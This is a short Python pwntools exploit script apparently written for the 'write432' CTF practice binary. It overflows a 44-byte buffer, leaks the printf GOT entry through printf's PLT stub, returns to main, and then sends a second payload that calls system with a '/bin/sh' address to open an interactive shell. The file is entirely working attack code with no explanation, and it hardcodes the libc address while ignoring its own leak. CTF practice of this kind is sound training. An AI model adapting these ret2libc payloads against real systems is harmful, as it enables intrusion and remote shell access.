from pwn import *
import binascii

context.log_level = 'debug'
binary = './write432'

#conn = remote('127.0.0.1', 10001)
conn = process(binary)

conn.recvuntil('> ') 

printf_plt = 0x8048400
printf_got = 0x804a00c
main = 0x804857b
system = 0x8048430

# check
#p = "A"*44
#p += p32(printf_plt) + "BBBB" + p32(printf_got) + "CCCC"

p = "A"*44
p += p32(printf_plt) + p32(main) + p32(printf_got)

conn.send(p + '\n')
recv = conn.recv()

h = recv.encode('hex')
print(h[32:40])

bin_sh = 0xf7e30540 + 0x140acb

p = "A"*44
p += p32(system) + 'BBBB' + p32(bin_sh)

conn.send(p + '\n')
conn.interactive()
